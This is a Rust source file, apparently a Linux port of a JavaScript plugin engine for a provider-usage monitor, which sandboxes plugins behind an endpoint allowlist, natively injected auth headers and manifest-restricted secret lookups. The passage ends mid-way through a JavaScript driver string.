//! JS/TS provider plugin engine — Linux port of `BirdNion/Plugins/PluginEngine.swift`.
//!
//! Plugins are `.js` files implementing CodexBar's `defineProvider({...})`
//! contract, discovered in `~/.config/birdnion/plugins/` plus a small bundled
//! set compiled into the binary. Each file runs inside a boa context with a
//! `ctx` bridge (http / settings / storage / format / fail) mirroring the
//! upstream plugin API.
//!
//! Security: secrets never reach JS — `ctx.settings.getSecret` is only a
//! lookup, and the auth header is injected natively after the endpoint policy
//! check. HTTP is restricted to the manifest's declared `endpoints` (https
//! origins, or `{setting, policy}` bases resolved at fetch time, with
//! loopback/private http allowed per policy).

use std::collections::HashSet;
use std::path::PathBuf;

use boa_engine::{
    js_string,
    Context, Finalize, JsArgs, JsData, JsError, JsNativeError, JsResult, JsValue,
    NativeFunction, Source, Trace,
};
use chrono::TimeZone;
use serde::Deserialize;

use crate::config;
use super::{display_name, ProviderStatus, QuotaWindow};

// ---------------------------------------------------------------------------
// Manifest types (upstream contract)

#[derive(Debug, Clone)]
pub enum PluginEndpoint {
    Origin(String), // normalized "scheme://host[:port]"
    Setting { key: String, policy: String },
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PluginAuth {
    #[serde(rename = "type")]
    pub kind: String,
    pub secret: String,
    /// For type "header".
    pub header: Option<String>,
    /// For type "authorization-scheme" (e.g. "Basic").
    pub scheme: Option<String>,
}

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
pub struct PluginSetting {
    pub key: String,
    pub title: Option<String>,
    #[serde(rename = "type")]
    pub kind: Option<String>,
}

#[derive(Debug, Deserialize)]
pub struct PluginManifest {
    pub id: String,
    pub name: String,
    pub auth: Option<PluginAuth>,
    #[serde(default)]
    #[allow(dead_code)]
    pub settings: Vec<PluginSetting>,
    #[serde(default)]
    pub capabilities: HashSet<String>,
    #[serde(skip)]
    pub endpoints: Vec<PluginEndpoint>,
}

/// Raw manifest shape for JSON decode — `endpoints` entries are strings
/// (https origins) or `{setting, policy}` objects.
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct RawManifest {
    id: String,
    name: String,
    auth: Option<PluginAuth>,
    settings: Option<Vec<PluginSetting>>,
    capabilities: Option<HashSet<String>>,
    endpoints: Option<Vec<serde_json::Value>>,
    #[allow(dead_code)]
    icon: Option<serde_json::Value>,
    #[allow(dead_code)]
    top_level: Option<bool>,
}

fn parse_manifest(json: &serde_json::Value) -> Result<PluginManifest, String> {
    let raw: RawManifest =
        serde_json::from_value(json.clone()).map_err(|e| format!("bad manifest: {e}"))?;
    if raw.id.trim().is_empty() {
        return Err("manifest missing id".into());
    }
    let mut endpoints = Vec::new();
    for e in raw.endpoints.unwrap_or_default() {
        match e {
            serde_json::Value::String(s) => {
                if !s.starts_with("https://") {
                    return Err(format!("endpoint must be an https origin: {s}"));
                }
                endpoints.push(PluginEndpoint::Origin(s));
            }
            serde_json::Value::Object(o) => {
                let key = o
                    .get("setting")
                    .and_then(|v| v.as_str())
                    .ok_or("endpoint object missing 'setting'")?
                    .to_string();
                let policy = o
                    .get("policy")
                    .and_then(|v| v.as_str())
                    .unwrap_or("https")
                    .to_string();
                endpoints.push(PluginEndpoint::Setting { key, policy });
            }
            _ => return Err("endpoint must be a string or {setting, policy}".into()),
        }
    }
    Ok(PluginManifest {
        id: raw.id,
        name: raw.name,
        auth: raw.auth,
        settings: raw.settings.unwrap_or_default(),
        capabilities: raw.capabilities.unwrap_or_default(),
        endpoints,
    })
}

// ---------------------------------------------------------------------------
// Plugin result types (CodexBarUsageSnapshot shape)

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct PluginRateWindow {
    used_percent: Option<f64>,
    /// `usageKnown: false` → inactive window (quota exists, no usage data yet).
    usage_known: Option<bool>,
    window_minutes: Option<f64>,
    resets_at: Option<serde_json::Value>,
    reset_description: Option<String>,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct PluginNamedRateWindow {
    id: Option<String>,
    title: Option<String>,
    #[serde(flatten)]
    rate: PluginRateWindow,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct PluginCost {
    balance: Option<f64>,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct PluginIdentity {
    email: Option<String>,
    organization: Option<String>,
    #[allow(dead_code)]
    login_method: Option<String>,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct PluginUsageSnapshot {
    primary: Option<PluginRateWindow>,
    secondary: Option<PluginRateWindow>,
    tertiary: Option<PluginRateWindow>,
    extra_windows: Option<Vec<PluginNamedRateWindow>>,
    cost: Option<PluginCost>,
    identity: Option<PluginIdentity>,
}

/// FetchResult union: either a bare snapshot or `{usage, sourceLabel}`.
#[derive(Debug)]
struct PluginResult {
    snapshot: PluginUsageSnapshot,
    source_label: Option<String>,
}

// ---------------------------------------------------------------------------
// Engine

#[derive(Clone, Finalize, Trace, JsData)]
struct PluginState {
    endpoints: Vec<EndpointOwned>,
    auth_kind: Option<String>,
    auth_header_name: Option<String>,
    auth_scheme: Option<String>,
    /// Settings key name of `auth.secret` — the only key allowed to fall back
    /// to the stored credential in `ctx.settings.get`.
    auth_secret_name: Option<String>,
    /// Keys declared in `manifest.settings` — the only names
    /// `ctx.settings.get`/`getSecret` may resolve (plus endpoint setting
    /// keys). Anything else is refused so JS cannot read arbitrary env vars.
    settings_keys: Vec<String>,
    secret: Option<String>,
    setting_base: Option<String>,
    storage_dir: PathBuf,
    storage_enabled: bool,
}

#[derive(Clone, Finalize, Trace)]
struct EndpointOwned {
    origin: Option<String>,
    setting_key: Option<String>,
    /// Resolved base URL for `{setting, policy}` endpoints — env var named by
    /// the setting key, else the provider's configured base_url. Never the
    /// API key (a credential is not a URL).
    base: Option<String>,
    policy: String,
}

fn endpoint_owned(e: &PluginEndpoint, setting_base: Option<&String>) -> EndpointOwned {
    match e {
        PluginEndpoint::Origin(o) => EndpointOwned {
            origin: Some(o.clone()),
            setting_key: None,
            base: None,
            policy: "https".into(),
        },
        PluginEndpoint::Setting { key, policy } => {
            let base = std::env::var(key)
                .ok()
                .map(|v| v.trim().to_string())
                .filter(|v| !v.is_empty())
                .or_else(|| setting_base.cloned());
            EndpointOwned {
                origin: None,
                setting_key: Some(key.clone()),
                base,
                policy: policy.clone(),
            }
        }
    }
}

struct Engine {
    context: Context,
    manifest: PluginManifest,
}

impl Engine {
    fn new(source: &str, secret: Option<String>, setting_base: Option<String>) -> Result<Self, String> {
        let mut context = Context::default();
        context
            .eval(Source::from_bytes(PRELUDE))
            .map_err(|e| format!("prelude: {}", js_err(e)))?;
        context
            .eval(Source::from_bytes(source))
            .map_err(|e| format!("plugin source: {}", js_err(e)))?;
        let def = global(&mut context, "__birdnionPluginDef")?;
        if def.is_undefined() || def.is_null() {
            return Err("plugin did not call defineProvider()".into());
        }
        let json = def
            .to_json(&mut context)
            .map_err(|e| format!("manifest read: {}", js_err(e)))?;
        let manifest = parse_manifest(&json)?;

        // Secret resolution: env var named by `auth.secret` (upstream contract)
        // first, then the provider's stored apiKey in settings.json.
        let resolved = manifest
            .auth
            .as_ref()
            .and_then(|a| std::env::var(&a.secret).ok())
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
            .or(secret);

        let state = PluginState {
            endpoints: manifest
                .endpoints
                .iter()
                .map(|e| endpoint_owned(e, setting_base.as_ref()))
                .collect(),
            auth_kind: manifest.auth.as_ref().map(|a| a.kind.clone()),
            auth_header_name: manifest.auth.as_ref().and_then(|a| a.header.clone()),
            auth_scheme: manifest.auth.as_ref().and_then(|a| a.scheme.clone()),
            auth_secret_name: manifest.auth.as_ref().map(|a| a.secret.clone()),
            settings_keys: manifest.settings.iter().map(|s| s.key.clone()).collect(),
            secret: resolved,
            setting_base: setting_base.clone(),
            storage_dir: plugins_dir().join(&manifest.id),
            storage_enabled: manifest.capabilities.contains("persistent-storage"),
        };
        context.insert_data(state);
        install_bridge(&mut context)?;
        // Re-eval ctx creation so `ctx` exists (prelude already made it; the
        // natives were registered after — refresh for clarity is unnecessary).
        Ok(Self { context, manifest })
    }

    fn fetch_usage(&mut self) -> Result<PluginResult, String> {
        self.context
            .eval(Source::from_bytes("globalThis.__birdnionResult = undefined"))
            .map_err(|e| js_err(e))?;
        self.context
            .eval(Source::from_bytes(FETCH_DRIVER))
            .map_err(|e| format!("fetchUsage threw: {}", js_err(e)))?;
        self.context.run_jobs();
        let result = global(&mut self.context, "__birdnionResult")?;
        if result.is_undefined() || result.is_null() {
            return Err("fetchUsage did not settle".into());
        }
        let err = result
            .as_object()
            .and_then(|o| o.get(js_string!("err"), &mut self.context).ok());
        if let Some(err) = err.filter(|e| !e.is_undefined()) {
            let msg = js_prop_str(&err, "message", &mut self.context)
                .unwrap_or_else(|| "plugin error".into());
            return Err(msg);
        }
        let ok = js_prop_str(&result, "ok", &mut self.context)
            .ok_or("empty fetch result")?;
        let v: serde_json::Value =
            serde_json::from_str(&ok).map_err(|e| format!("bad snapshot JSON: {e}"))?;
        // FetchResult union: {usage, sourceLabel} or bare snapshot.
        let (snap_json, label) = if v.get("usage").is_some() {
            (
                v.get("usage").cloned().unwrap_or_default(),
                v.get("sourceLabel").and_then(|l| l.as_str()).map(String::from),
            )
        } else {
            (v, None)
        };
        let snapshot: PluginUsageSnapshot =
            serde_json::from_value(snap_json).map_err(|e| format!("snapshot decode: {e}"))?;
        Ok(PluginResult {
            snapshot,
            source_label: label,
        })
    }
}

fn js_err(e: JsError) -> String {
    e.to_string()
}

fn global(ctx: &mut Context, name: &str) -> Result<JsValue, String> {
    ctx.global_object()
        .get(js_string!(name), ctx)
        .map_err(|e| js_err(e))
}

fn js_prop_str(v: &JsValue, key: &str, ctx: &mut Context) -> Option<String> {
    let p = v.as_object()?.get(js_string!(key), ctx).ok()?;
    if p.is_undefined() || p.is_null() {
        return None;
    }
    p.to_string(ctx).ok().map(|s| s.to_std_string_escaped())
}

// ---------------------------------------------------------------------------
// Native bridge

fn install_bridge(ctx: &mut Context) -> Result<(), String> {
    let fns: &[(&str, NativeFunction)] = &[
        ("__birdnionHttp", NativeFunction::from_fn_ptr(http_native)),
        ("__birdnionGetSecret", NativeFunction::from_fn_ptr(secret_native)),
        ("__birdnionStorageGet", NativeFunction::from_fn_ptr(storage_get)),
        ("__birdnionStorageSet", NativeFunction::from_fn_ptr(storage_set)),
        ("__birdnionStorageRemove", NativeFunction::from_fn_ptr(storage_remove)),
        ("__birdnionFormatUSD", NativeFunction::from_fn_ptr(format_usd)),
        ("__birdnionFormatCurrency", NativeFunction::from_fn_ptr(format_currency)),
        ("__birdnionFormatNumber", NativeFunction::from_fn_ptr(format_number)),
        ("__birdnionNextDailyReset", NativeFunction::from_fn_ptr(next_daily_reset)),
        ("__birdnionLog", NativeFunction::from_fn_ptr(log_native)),
    ];
    for (name, f) in fns {
        ctx.register_global_callable(js_string!(*name), 2, f.clone())
            .map_err(|e| js_err(e))?;
    }
    Ok(())
}

fn arg_str(args: &[JsValue], i: usize, ctx: &mut Context) -> Option<String> {
    args.get_or_undefined(i)
        .to_string(ctx)
        .ok()
        .map(|s| s.to_std_string_escaped())
}

fn js_err_value(msg: &str) -> JsError {
    JsNativeError::error().with_message(msg.to_string()).into()
}

fn state(ctx: &Context) -> PluginState {
    ctx.get_data::<PluginState>().expect("plugin state").clone()
}

/// `isAllowed(url)` — the URL must share scheme+host+port with a declared
/// https origin, or with the resolved base of a `{setting, policy}` endpoint
/// (http additionally allowed for loopback/private hosts per policy).
fn url_allowed(state: &PluginState, url: &str) -> bool {
    let Ok(parsed) = url::Url::parse(url) else { return false };
    for ep in &state.endpoints {
        let base_raw = match (&ep.origin, &ep.setting_key) {
            (Some(o), _) => Some(o.clone()),
            (_, Some(_)) => ep.base.clone(),
            _ => None,
        };
        let Some(base_raw) = base_raw else { continue };
        let Ok(base) = url::Url::parse(&base_raw) else { continue };
        if same_origin(&parsed, &base) {
            return true;
        }
        let host = base.host_str().unwrap_or_default().to_lowercase();
        let loopback = matches!(host.as_str(), "localhost" | "127.0.0.1" | "::1");
        let private = is_private_ipv4(&host);
        if ep.policy != "https"
            && parsed.scheme() == "http"
            && parsed.host_str().map(|h| h.to_lowercase()) == Some(host.clone())
            && (loopback || (ep.policy == "https-or-private-network-http" && private))
        {
            return true;
        }
    }
    false
}

/// RFC 1918 private IPv4: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16.
fn is_private_ipv4(host: &str) -> bool {
    if host.starts_with("10.") || host.starts_with("192.168.") {
        return true;
    }
    if !host.starts_with("172.") {
        return false;
    }
    host.split('.')
        .nth(1)
        .and_then(|s| s.parse::<u8>().ok())
        .is_some_and(|o| (16..=31).contains(&o))
}

fn same_origin(a: &url::Url, b: &url::Url) -> bool {
    a.scheme() == b.scheme()
        && a.host_str().map(str::to_lowercase) == b.host_str().map(str::to_lowercase)
        && a.port_or_known_default() == b.port_or_known_default()
}

#[derive(Deserialize)]
struct HttpRequestJson {
    method: String,
    url: String,
    #[serde(default)]
    headers: std::collections::HashMap<String, String>,
    body: Option<String>,
    #[serde(rename = "timeoutSeconds")]
    timeout_seconds: Option<f64>,
}

/// `__birdnionHttp(requestJSON) -> {url,status,headers,bodyText}|{error}`.
/// Runs the request on a dedicated std::thread so a blocking HTTP client is
/// never created inside a tokio runtime thread.
fn http_native(_: &JsValue, args: &[JsValue], ctx: &mut Context) -> JsResult<JsValue> {
    let Some(req_json) = arg_str(args, 0, ctx) else {
        return Ok(json_val(ctx, serde_json::json!({ "error": "bad request" }))?);
    };
    let st = state(ctx);
    let result = std::thread::spawn(move || http_request(&req_json, &st))
        .join()
        .unwrap_or_else(|_| Err("http worker panicked".into()));
    let v = match result {
        Ok(v) => v,
        Err(msg) => serde_json::json!({ "error": msg }),
    };
    json_val(ctx, v)
}

fn http_request(req_json: &str, st: &PluginState) -> Result<serde_json::Value, String> {
    let req: HttpRequestJson =
        serde_json::from_str(req_json).map_err(|e| format!("bad request: {e}"))?;
    if !url_allowed(st, &req.url) {
        return Err(format!("endpoint not allowed: {}", req.url));
    }
    let timeout = req
        .timeout_seconds
        .unwrap_or(15.0)
        .clamp(1.0, 90.0);
    let agent = ureq::Agent::new_with_config(
        ureq::config::Config::builder()
            .timeout_global(Some(std::time::Duration::from_secs_f64(timeout)))
            .http_status_as_error(false)
            // Redirects are followed manually below — every hop is
            // re-validated against the endpoint allowlist so the injected
            // auth header can never reach an undeclared host.
            .max_redirects(0)
            .build(),
    );
    let mut method = req.method.to_uppercase();
    let mut body = req.body;
    let mut url = req.url.clone();
    let mut resp;
    let mut hops = 0;
    loop {
        resp = {
            // ureq splits body-capable methods into a different builder type,
            // so the two families send through separate paths.
            let bodiless = |b: ureq::RequestBuilder<ureq::typestate::WithoutBody>| {
                let mut b = b;
                for (k, v) in &req.headers {
                    b = b.header(k, v);
                }
                if let Some(auth) = auth_header(st) {
                    b = b.header(&auth.0, &auth.1);
                }
                b.call()
            };
            let bodied = |b: ureq::RequestBuilder<ureq::typestate::WithBody>| {
                let mut b = b.header("Content-Type", "application/json");
                for (k, v) in &req.headers {
                    b = b.header(k, v);
                }
                if let Some(auth) = auth_header(st) {
                    b = b.header(&auth.0, &auth.1);
                }
                b.send(body.clone().unwrap_or_default().as_bytes())
            };
            match method.as_str() {
                "GET" => bodiless(agent.get(&url)),
                "HEAD" => bodiless(agent.head(&url)),
                "DELETE" => bodiless(agent.delete(&url)),
                "POST" => bodied(agent.post(&url)),
                "PUT" => bodied(agent.put(&url)),
                "PATCH" => bodied(agent.patch(&url)),
                _ => return Err(format!("unsupported method {method}")),
            }
        }
        .map_err(|e| format!("transport: {e}"))?;

        // Redirects are followed manually: every hop is re-validated against
        // the endpoint allowlist, so the injected auth header can never reach
        // an undeclared host. A 3xx pointing elsewhere is surfaced to JS
        // (which may re-request the Location — it is allowlist-checked too).
        let status = resp.status().as_u16();
        let next = if matches!(status, 301 | 302 | 303 | 307 | 308) {
            resp.headers()
                .get("location")
                .and_then(|v| v.to_str().ok())
                .and_then(|loc| {
                    url::Url::parse(loc)
                        .ok()
                        .or_else(|| url::Url::parse(&url).ok()?.join(loc).ok())
                })
                .filter(|u| url_allowed(st, u.as_str()))
        } else {
            None
        };
        let Some(next) = next else { break };
        hops += 1;
        if hops > 10 {
            break;
        }
        // 301/302/303 rewrite body methods to GET (fetch semantics).
        if status != 307 && status != 308 && method != "GET" && method != "HEAD" {
            method = "GET".into();
            body = None;
        }
        url = next.to_string();
    }
    let status = resp.status().as_u16() as i64;
    let headers: serde_json::Map<String, serde_json::Value> = resp
        .headers()
        .iter()
        .map(|(k, v)| {
            (
                k.to_string().to_lowercase(),
                serde_json::Value::String(v.to_str().unwrap_or_default().to_string()),
            )
        })
        .collect();
    let body_text = {
        use std::io::Read;
        let mut buf = Vec::new();
        resp.body_mut()
            .as_reader()
            .take(1_048_576)
            .read_to_end(&mut buf)
            .map_err(|e| format!("body read: {e}"))?;
        String::from_utf8_lossy(&buf).into_owned()
    };
    Ok(serde_json::json!({
        "url": url,
        "status": status,
        "headers": serde_json::Value::Object(headers),
        "bodyText": body_text,
    }))
}

/// Auth header injected natively — JS never sees the raw secret.
/// None when the manifest declares no auth or an unsupported type —
/// matches the macOS engine (no implicit Bearer).
fn auth_header(st: &PluginState) -> Option<(String, String)> {
    let kind = st.auth_kind.as_deref()?;
    let secret = st.secret.as_ref()?.trim().to_string();
    if secret.is_empty() {
        return None;
    }
    match kind {
        "bearer" => Some(("Authorization".into(), format!("Bearer {secret}"))),
        "x-api-key" => Some(("x-api-key".into(), secret)),
        "authorization-scheme" => st
            .auth_scheme
            .clone()
            .map(|scheme| ("Authorization".into(), format!("{scheme} {secret}"))),
        "header" => st.auth_header_name.clone().map(|name| (name, secret)),
        _ => None,
    }
}

fn secret_native(_: &JsValue, args: &[JsValue], ctx: &mut Context) -> JsResult<JsValue> {
    let key = arg_str(args, 0, ctx).unwrap_or_default();
    let st = state(ctx);
    // Only manifest-declared keys resolve at all — otherwise JS could read
    // arbitrary process env vars (HOME, GITHUB_TOKEN, ...) through this
    // bridge. Upstream plugins declare every key they read in `settings` or
    // `endpoints`, so this is contract-safe.
    let declared = st.settings_keys.iter().any(|k| k == &key)
        || st
            .endpoints
            .iter()
            .any(|e| e.setting_key.as_deref() == Some(key.as_str()));
    if !declared {
        return Ok(JsValue::null());
    }
    // Env var named by the setting key wins; URL-valued settings then resolve
    // to the provider's configured base_url — never to a credential.
    if let Ok(v) = std::env::var(&key) {
        let v = v.trim().to_string();
        if !v.is_empty() {
            return Ok(JsValue::from(js_string!(v.as_str())));
        }
    }
    if key.ends_with("URL") || key.ends_with("_ENDPOINT") || key.ends_with("_ORIGIN") {
        return match &st.setting_base {
            Some(s) if !s.trim().is_empty() => Ok(JsValue::from(js_string!(s.trim()))),
            _ => Ok(JsValue::null()),
        };
    }
    // Only the declared auth secret falls back to the stored credential —
    // other declared settings resolve env-only for now (no persisted per-key
    // storage slot exists yet).
    if st.auth_secret_name.as_deref() == Some(key.as_str()) {
        return match &st.secret {
            Some(s) if !s.trim().is_empty() => Ok(JsValue::from(js_string!(s.trim()))),
            _ => Ok(JsValue::null()),
        };
    }
    Ok(JsValue::null())
}

fn storage_file(st: &PluginState) -> Result<PathBuf, String> {
    if !st.storage_enabled {
        return Err("storage requires the persistent-storage capability".into());
    }
    Ok(st.storage_dir.join("storage.json"))
}

fn read_storage(st: &PluginState) -> serde_json::Map<String, serde_json::Value> {
    storage_file(st)
        .ok()
        .and_then(|p| std::fs::read_to_string(p).ok())
        .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
        .and_then(|v| v.as_object().cloned())
        .unwrap_or_default()
}

fn storage_get(_: &JsValue, args: &[JsValue], ctx: &mut Context) -> JsResult<JsValue> {
    let st = state(ctx);
    let key = arg_str(args, 0, ctx).unwrap_or_default();
    match read_storage(&st).get(&key) {
        Some(serde_json::Value::String(s)) => Ok(JsValue::from(js_string!(s.as_str()))),
        _ => Ok(JsValue::undefined()),
    }
}

fn storage_set(_: &JsValue, args: &[JsValue], ctx: &mut Context) -> JsResult<JsValue> {
    let st = state(ctx);
    let key = arg_str(args, 0, ctx).unwrap_or_default();
    let val = arg_str(args, 1, ctx).unwrap_or_default();
    let mut map = read_storage(&st);
    map.insert(key, serde_json::Value::String(val));
    if let Ok(file) = storage_file(&st) {
        if let Some(dir) = file.parent() {
            let _ = std::fs::create_dir_all(dir);
        }
        if let Ok(json) = serde_json::to_string_pretty(&map) {
            let _ = std::fs::write(&file, json);
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let _ = std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600));
            }
        }
    }
    Ok(JsValue::undefined())
}

fn storage_remove(_: &JsValue, args: &[JsValue], ctx: &mut Context) -> JsResult<JsValue> {
    let st = state(ctx);
    let key = arg_str(args, 0, ctx).unwrap_or_default();
    let mut map = read_storage(&st);
    map.remove(&key);
    if let Ok(file) = storage_file(&st) {
        if let Ok(json) = serde_json::to_string_pretty(&map) {
            let _ = std::fs::write(&file, json);
        }
    }
    Ok(JsValue::undefined())
}

fn format_usd(_: &JsValue, args: &[JsValue], ctx: &mut Context) -> JsResult<JsValue> {
    let n = args.get_or_undefined(0).to_number(ctx).unwrap_or(0.0);
    Ok(JsValue::from(js_string!(format!("${:.2}", n).as_str())))
}

fn format_currency(_: &JsValue, args: &[JsValue], ctx: &mut Context) -> JsResult<JsValue> {
    let n = args.get_or_undefined(0).to_number(ctx).unwrap_or(0.0);
    let code = arg_str(args, 1, ctx).unwrap_or_else(|| "usd".into());
    Ok(JsValue::from(js_string!(format!("{n:.2} {}", code.to_uppercase()).as_str())))
}

fn format_number(_: &JsValue, args: &[JsValue], ctx: &mut Context) -> JsResult<JsValue> {
    let n = args.get_or_undefined(0).to_number(ctx).unwrap_or(0.0);
    Ok(JsValue::from(js_string!(format!("{n:.0}").as_str())))
}

fn next_daily_reset(_: &JsValue, args: &[JsValue], ctx: &mut Context) -> JsResult<JsValue> {
    let tz = arg_str(args, 0, ctx).unwrap_or_else(|| "UTC".into());
    let hour = args.get_or_undefined(1).to_number(ctx).unwrap_or(0.0) as i64;
    let zone: chrono_tz::Tz = tz.parse().unwrap_or(chrono_tz::UTC);
    let now = chrono::Utc::now().with_timezone(&zone);
    let mut candidate = now
        .date_naive()
        .and_hms_opt(hour as u32, 0, 0)
        .and_then(|d| zone.from_local_datetime(&d).single())
        .unwrap_or(now);
    if candidate <= now {
        candidate += chrono::Duration::days(1);
    }
    let millis = candidate.timestamp_millis();
    Ok(JsValue::from(js_string!(format!(
        "{}",
        candidate.to_rfc3339_opts(chrono::SecondsFormat::Millis, true)
    ).as_str())))
        .map(|v| {
            let _ = millis;
            v
        })
}

fn log_native(_: &JsValue, args: &[JsValue], ctx: &mut Context) -> JsResult<JsValue> {
    let msg = arg_str(args, 0, ctx).unwrap_or_default();
    eprintln!("[plugin] {msg}");
    Ok(JsValue::undefined())
}

fn json_val(ctx: &mut Context, v: serde_json::Value) -> JsResult<JsValue> {
    JsValue::from_json(&v, ctx).map_err(|e| js_err_value(&e.to_string()).into())
}

// ---------------------------------------------------------------------------
// Registry + dispatch

/// Bundled plugins compiled in (Resources/Plugins is a macOS bundle layout;
/// on Linux we embed sources directly).
const BUNDLED: &[(&str, &str)] = &[
    (
        "atlascloud.js",
        include_str!("../../resources/plugins/atlascloud.js"),
    ),
    (
        "xkiro.js",
        include_str!("../../resources/plugins/xkiro.js"),
    ),
    (
        "raycast.js",
        include_str!("../../resources/plugins/raycast.js"),
    ),
    (
        "aixy.js",
        include_str!("../../resources/plugins/aixy.js"),
    ),
    (
        "litellm.js",
        include_str!("../../resources/plugins/litellm.js"),
    ),
];

pub fn plugins_dir() -> PathBuf {
    config::support_dir()
        .unwrap_or_else(|| PathBuf::from(".config/birdnion"))
        .join("plugins")
}

/// One row per valid discovered plugin — used by the settings roster.
pub struct PluginInfo {
    pub id: String,
    pub name: String,
    pub has_auth: bool,
}

/// Every valid discovered plugin (bundled + user dir), deduped by id.
pub fn discovered() -> Vec<PluginInfo> {
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    let mut sources: Vec<String> = BUNDLED.iter().map(|(_, s)| s.to_string()).collect();
    if let Ok(rd) = std::fs::read_dir(plugins_dir()) {
        for entry in rd.flatten() {
            let p = entry.path();
            if p.extension().and_then(|e| e.to_str()) == Some("js") {
                if let Ok(s) = std::fs::read_to_string(&p) {
                    sources.push(s);
                }
            }
        }
    }
    for source in sources {
        if let Ok(engine) = Engine::new(&source, None, None) {
            if seen.insert(engine.manifest.id.clone()) {
                out.push(PluginInfo {
                    id: engine.manifest.id.clone(),
                    name: engine.manifest.name.clone(),
                    has_auth: engine.manifest.auth.is_some(),
                });
            }
        }
    }
    out
}

fn engine_for(id: &str, cfg: &config::Provider) -> Result<Engine, String> {
    let sources: Vec<String> = BUNDLED
        .iter()
        .map(|(_, s)| s.to_string())
        .chain(
            std::fs::read_dir(plugins_dir())
                .map(|rd| {
                    rd.flatten()
                        .filter(|e| e.path().extension().and_then(|x| x.to_str()) == Some("js"))
                        .filter_map(|e| std::fs::read_to_string(e.path()).ok())
                        .collect::<Vec<_>>()
                })
                .unwrap_or_default(),
        )
        .collect();
    let secret = config::api_key(cfg);
    let base = cfg
        .base_url
        .as_deref()
        .map(str::trim)
        .filter(|v| !v.is_empty())
        .map(str::to_string);
    for source in sources {
        if let Ok(engine) = Engine::new(&source, secret.clone(), base.clone()) {
            if engine.manifest.id == id {
                return Ok(engine);
            }
        }
    }
    Err(format!("no plugin found for id '{id}'"))
}

/// Fallback dispatch for ids no native provider owns.
pub async fn fetch_or_unsupported(cfg: &config::Provider) -> ProviderStatus {
    let status = fetch(cfg).await;
    // engine_for reports unknown ids as "no plugin found" — surface the
    // friendly unsupported message for that specific case.
    if status
        .error
        .as_deref()
        .is_some_and(|e| e.contains("no plugin found"))
    {
        return ProviderStatus::failure(
            &cfg.id,
            &display_name(cfg),
            "Chưa hỗ trợ trên Linux (đang port)",
        );
    }
    status
}

pub async fn fetch(cfg: &config::Provider) -> ProviderStatus {
    let cfg = cfg.clone();
    let id = cfg.id.clone();
    let display = display_name(&cfg);
    match tokio::task::spawn_blocking(move || {
        let mut engine = engine_for(&cfg.id, &cfg)?;
        let result = engine.fetch_usage()?;
        Ok::<_, String>((engine.manifest.name.clone(), result))
    })
    .await
    {
        Ok(Ok((name, result))) => map_status(&result, &id, &name),
        Ok(Err(e)) => ProviderStatus::failure(&id, &display, e),
        Err(e) => ProviderStatus::failure(&id, &display, format!("plugin worker: {e}")),
    }
}

// ---------------------------------------------------------------------------
// Snapshot → ProviderStatus mapping (mirrors PluginSnapshotMapper)

fn map_status(result: &PluginResult, id: &str, display_name: &str) -> ProviderStatus {
    let s = &result.snapshot;
    let mut windows = Vec::new();
    for (position, w) in [s.primary.as_ref(), s.secondary.as_ref(), s.tertiary.as_ref()]
        .into_iter()
        .enumerate()
    {
        if let Some(w) = w {
            windows.push(map_window(w, positional_label(w, position)));
        }
    }
    for named in s.extra_windows.as_deref().unwrap_or_default() {
        windows.push(map_window(
            &named.rate,
            named
                .title
                .clone()
                .or_else(|| named.id.clone())
                .unwrap_or_else(|| "Extra".into()),
        ));
    }
    ProviderStatus {
        id: id.to_string(),
        display_name: display_name.to_string(),
        windows,
        last_updated: chrono::Utc::now().timestamp(),
        account_label: s
            .identity
            .as_ref()
            .and_then(|i| i.email.clone().or_else(|| i.organization.clone())),
        credits_remaining: s
            .cost
            .as_ref()
            .and_then(|c| c.balance)
            .filter(|b| b.is_finite() && *b >= 0.0),
        source_label: result.source_label.clone(),
        ..Default::default()
    }
}

fn map_window(w: &PluginRateWindow, label: String) -> QuotaWindow {
    // No used_percent means usage is unknown — don't fabricate 0%.
    let usage_known = w.usage_known.unwrap_or(w.used_percent.is_some());
    let used_pct = ((w.used_percent.unwrap_or(0.0)).round() as i32).clamp(0, 100);
    QuotaWindow {
        label,
        used_pct: if usage_known { used_pct } else { 0 },
        remaining_pct: if usage_known { 100 - used_pct } else { 100 },
        subtitle: w.reset_description.clone(),
        resets_at: w.resets_at.as_ref().and_then(parse_timestamp),
        window_seconds: w
            .window_minutes
            .filter(|m| m.is_finite() && *m >= 0.0)
            .map(|m| (m * 60.0).min(i64::MAX as f64) as i64),
        allowance: None,
        semantic_key: None,
        semantic_kind: None,
    }
}

/// "2030-01-01T00:00:00Z" string or epoch-seconds number → unix seconds.
fn parse_timestamp(v: &serde_json::Value) -> Option<i64> {
    match v {
        serde_json::Value::Number(n) => n.as_i64().or_else(|| n.as_f64().map(|f| f as i64)),
        serde_json::Value::String(s) => chrono::DateTime::parse_from_rfc3339(s)
            .ok()
            .map(|d| d.timestamp()),
        _ => None,
    }
}

/// Positional label from window length — mirrors the macOS mapper
/// ("5 giờ" / "Ngày" / "Tuần" / "Tháng").
fn positional_label(w: &PluginRateWindow, position: usize) -> String {
    if let Some(minutes) = w.window_minutes {
        return match minutes as i64 {
            m if m < 720 => "5 giờ".into(),
            m if m < 2880 => "Ngày".into(),
            m if m < 20160 => "Tuần".into(),
            _ => "Tháng".into(),
        };
    }
    w.reset_description
        .clone()
        .unwrap_or_else(|| ["Phiên", "Tuần", "Tháng"][position.min(2)].to_string())
}

// ---------------------------------------------------------------------------
// JS prelude — mirrors the macOS engine's ctx bridge. `Intl` is guarded
// because boa runs without the intl feature.

const FETCH_DRIVER: &str = r#"
try {
  Promise.resolve(__birdnionPluginDef.fetchUsage(globalThis.__birdnionCtx)).then(
    function (v) { globalThis.__birdnionResult = { ok: JSON.stringify(v) }; },
    function (e) {
